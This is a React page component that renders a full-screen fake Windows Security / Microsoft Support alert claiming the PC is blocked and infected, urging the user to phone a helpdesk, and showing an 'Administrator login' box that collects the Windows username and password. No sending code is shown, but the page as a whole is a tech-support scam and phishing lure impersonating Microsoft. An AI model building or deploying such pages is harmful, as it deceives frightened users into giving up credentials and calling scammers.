'use client';

import React, { useState } from 'react';

export default function WindowsSecurityPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  return (
    <div className="fixed inset-0 z-[200] bg-[#f0f0f0] overflow-hidden select-none">
      {/* Top Blue Warning Bar */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[700px] bg-[#0078d4] text-white text-xs p-3 rounded-b-lg shadow-lg z-50">
        <p className="text-center leading-relaxed">
          Access to this PC has been blocked for security reasons. Do not access or restart this windows. Ignoring this basic warning could result in the loss of information on this computer. Contact helpdesk as soon as possible, and a Windows expert will guide you through the investigation over the phone. Running this infection may put your PC at risk.
        </p>
        <p className="text-center font-bold mt-1">Microsoft Assistance</p>
      </div>

      {/* Background - Microsoft Support Website (simulated) */}
      <div className="absolute inset-0 bg-white">
        {/* Microsoft Header */}
        <div className="h-12 bg-white border-b border-gray-200 flex items-center px-6">
          <div className="flex items-center gap-2">
            <svg className="w-5 h-5" viewBox="0 0 23 23">
              <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
              <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
              <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
              <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
            </svg>
            <span className="font-semibold text-gray-800">Microsoft</span>
          </div>
          <nav className="ml-8 flex items-center gap-6 text-sm text-gray-600">
            <span>Support technique</span>
            <span>Microsoft 365</span>
          </nav>
        </div>
        
        {/* Page Content */}
        <div className="p-8 pt-20">
          <h2 className="text-xl font-semibold text-gray-800 mb-2">Sélectionnez le produit</h2>
          <p className="text-sm text-gray-600 mb-6">Nous vous montrerons d&apos;abord les options de support pour<br/>Microsoft.</p>
          
          <div className="grid grid-cols-4 gap-6 max-w-2xl">
            <div className="flex flex-col items-center p-4 hover:bg-gray-50 rounded-lg cursor-pointer">
              <svg className="w-12 h-12 mb-2" viewBox="0 0 23 23">
                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
              </svg>
              <span className="text-sm text-gray-700">Microsoft 365</span>
            </div>
            <div className="flex flex-col items-center p-4 hover:bg-gray-50 rounded-lg cursor-pointer">
              <div className="w-12 h-12 mb-2 bg-blue-600 rounded flex items-center justify-center text-white font-bold text-2xl">A</div>
              <span className="text-sm text-gray-700">Azure</span>
            </div>
          </div>
        </div>
      </div>

      {/* System Protection Window */}
      <div className="absolute top-16 left-[200px] w-[550px] bg-[#f0f0f0] border border-gray-400 shadow-xl rounded-sm z-20">
        {/* Title Bar */}
        <div className="h-8 bg-[#0078d4] flex items-center px-3 gap-2">
          <svg className="w-4 h-4" viewBox="0 0 23 23">
            <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
            <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
            <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
          </svg>
          <span className="text-white text-sm font-medium">System Protection</span>
          <div className="ml-auto flex">
            <button className="w-11 h-7 flex items-center justify-center text-white hover:bg-white/20">─</button>
            <button className="w-11 h-7 flex items-center justify-center text-white hover:bg-white/20">□</button>
            <button className="w-11 h-7 flex items-center justify-center text-white hover:bg-red-500">✕</button>
          </div>
        </div>
        
        {/* Menu Bar */}
        <div className="h-8 bg-white border-b border-gray-300 flex items-center px-2 gap-1">
          <button className="px-3 py-1 text-xs hover:bg-gray-100 rounded flex items-center gap-1">
            <span>📁</span> Diagnose
          </button>
        </div>
        
        {/* Red Warning Banner */}
        <div className="bg-[#c42b1c] text-white p-3">
          <h3 className="text-lg font-bold text-center">Windows-Defender</h3>
          <p className="text-sm text-center">Access to this system has been blocked for security reasons</p>
        </div>
        
        {/* Content */}
        <div className="p-4 bg-white">
          <h4 className="text-xl text-[#0078d4] font-medium mb-2">Regretfully, the assessment is not concluded</h4>
          <p className="text-sm text-gray-600 mb-2">Problem:</p>
          <p className="text-sm text-gray-600 mb-4">Potentially malicious software has been detected on your system.</p>
          <p className="text-sm text-[#0078d4] underline cursor-pointer mb-2">Get in touch for help</p>
          <p className="text-sm text-gray-600">System Support:</p>
        </div>
        
        {/* Bottom Bar */}
        <div className="h-10 bg-[#f0f0f0] border-t border-gray-300 flex items-center justify-between px-4">
          <div className="flex items-center gap-2">
            <svg className="w-5 h-5" viewBox="0 0 23 23">
              <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
              <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
              <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
              <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
            </svg>
            <span className="text-xs">Workstation<br/>Safety</span>
          </div>
          <button className="bg-[#c42b1c] text-white px-6 py-1.5 rounded text-sm font-medium hover:bg-[#a82315]">
            Audit
          </button>
        </div>
      </div>

      {/* Security Center Window */}
      <div className="absolute top-[150px] left-[280px] w-[450px] bg-white border border-gray-400 shadow-xl z-30">
        {/* Title Bar */}
        <div className="h-7 bg-[#ececec] border-b border-gray-300 flex items-center px-2">
          <div className="flex items-center gap-2">
            <div className="w-4 h-4 bg-[#0078d4] rounded-sm flex items-center justify-center">
              <span className="text-white text-xs">🛡️</span>
            </div>
            <span className="text-sm">Security Center</span>
          </div>
          <div className="ml-auto flex">
            <button className="w-6 h-6 flex items-center justify-center text-gray-600 hover:bg-gray-200 text-xs">─</button>
            <button className="w-6 h-6 flex items-center justify-center text-gray-600 hover:bg-gray-200 text-xs">□</button>
            <button className="w-6 h-6 flex items-center justify-center text-red-600 hover:bg-red-100 font-bold">✕</button>
          </div>
        </div>
        
        {/* Content */}
        <div className="p-6 text-center">
          <h3 className="text-[#0078d4] text-xl mb-4">Regretfully, the assessment is not concluded</h3>
        </div>
      </div>

      {/* Administrator Login Modal */}
      <div className="absolute top-[220px] left-[320px] w-[380px] bg-white border border-gray-300 shadow-2xl z-40">
        {/* Title Bar */}
        <div className="h-10 bg-[#f5f5f5] border-b border-gray-200 flex items-center justify-center relative">
          <span className="text-sm font-semibold text-gray-800">Administrator login</span>
          <button className="absolute right-2 w-7 h-7 flex items-center justify-center text-red-500 hover:bg-red-50 rounded font-bold text-lg">
            X
          </button>
        </div>
        
        {/* Content */}
        <div className="p-6">
          <p className="text-sm text-gray-700 text-center mb-1">Windows has been blocked due to suspicious activity.</p>
          <p className="text-sm text-gray-700 text-center mb-1">Try logging in again with your Windows account and password.</p>
          <p className="text-sm text-gray-700 text-center mb-6">If you need help , contact Windows Support.</p>
          
          <div className="space-y-4">
            <input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:border-blue-500"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:border-blue-500"
            />
            <button className="w-full bg-[#0078d4] text-white py-2.5 rounded text-sm font-medium hover:bg-[#006cbd]">
              Login
            </button>
          </div>
        </div>
      </div>

      {/* Microsoft Support Chat Widget */}
      <div className="absolute bottom-20 right-8 w-[200px] bg-white rounded-lg shadow-xl border border-gray-200 z-50">
        <div className="p-4 flex items-center gap-3">
          <svg className="w-8 h-8" viewBox="0 0 23 23">
            <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
            <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
            <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
          </svg>
          <div>
            <p className="font-semibold text-gray-800 text-sm">Microsoft</p>
            <p className="text-xs text-gray-500">Microsoft Support</p>
          </div>
        </div>
      </div>

      {/* Bottom Windows Security Bar */}
      <div className="absolute bottom-0 left-0 right-0 h-12 bg-[#0078d4] flex items-center justify-center gap-4 z-50">
        <div className="flex items-center gap-2">
          <svg className="w-5 h-5" viewBox="0 0 23 23">
            <rect x="1" y="1" width="10" height="10" fill="#fff"/>
            <rect x="12" y="1" width="10" height="10" fill="#fff"/>
            <rect x="1" y="12" width="10" height="10" fill="#fff"/>
            <rect x="12" y="12" width="10" height="10" fill="#fff"/>
          </svg>
          <span className="text-white text-sm font-medium">Windows Security</span>
        </div>
        <span className="text-white text-sm">Microsoft Support</span>
        <span className="text-white animate-pulse">|</span>
      </div>

      {/* Small warning text at very bottom */}
      <div className="absolute bottom-12 left-0 right-0 bg-[#ffeb3b] text-[10px] text-gray-800 text-center py-1 z-40">
        Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows Antivirus scan detected unwanted malware on this System that can steal
      </div>
    </div>
  );
}

